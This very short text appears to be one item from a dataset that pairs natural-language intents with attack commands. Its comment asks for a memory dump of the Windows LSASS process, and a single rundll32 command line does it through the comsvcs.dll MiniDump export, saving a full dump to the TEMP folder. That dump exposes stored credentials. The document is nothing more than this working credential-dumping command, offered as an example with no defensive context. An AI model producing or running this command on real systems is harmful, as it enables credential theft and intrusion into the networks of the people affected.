# Natural language intent:
# Create a memory dump of the LSASS process using rundll32.exe and comsvcs.dll.

C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
